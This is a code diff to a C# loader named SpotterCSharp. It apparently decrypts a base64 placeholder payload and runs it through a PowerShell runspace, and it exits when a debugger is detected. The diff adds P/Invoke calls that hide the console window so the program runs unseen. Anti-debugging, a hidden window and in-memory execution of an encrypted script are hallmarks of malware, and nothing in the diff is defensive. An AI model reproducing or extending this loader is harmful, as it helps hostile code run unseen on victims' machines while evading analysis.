@@ -1,10 +1,10 @@
 using System;
 using System.IO;
-using System.Security.Cryptography;
-using System.Text;
+using System.Management;
 using System.Management.Automation;
 using System.Management.Automation.Runspaces;
-
+using System.Security.Cryptography;
+using System.Text;
 
 namespace SpotterCSharp
 {
@@ -17,6 +17,8 @@ namespace SpotterCSharp
                 Console.WriteLine("Why are you debugging me noob?");
                 System.Environment.Exit(0);
             }
+            var hWindow = GetConsoleWindow();
+            ShowWindow(hWindow, 0);
             string encDllB64 = "ENCODED_COMMAND";
             byte[] encDllBytes = Convert.FromBase64String(encDllB64);
             var newIV = new byte[16];
@@ -93,6 +95,12 @@ namespace SpotterCSharp
             pipeline.Commands.AddScript(assemblyB64);
             pipeline.Invoke();
         }
+
+        [DllImport("kernel32.dll")]
+        static extern IntPtr GetConsoleWindow();
+
+        [DllImport("user32.dll")]
+        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
     }
 }
 
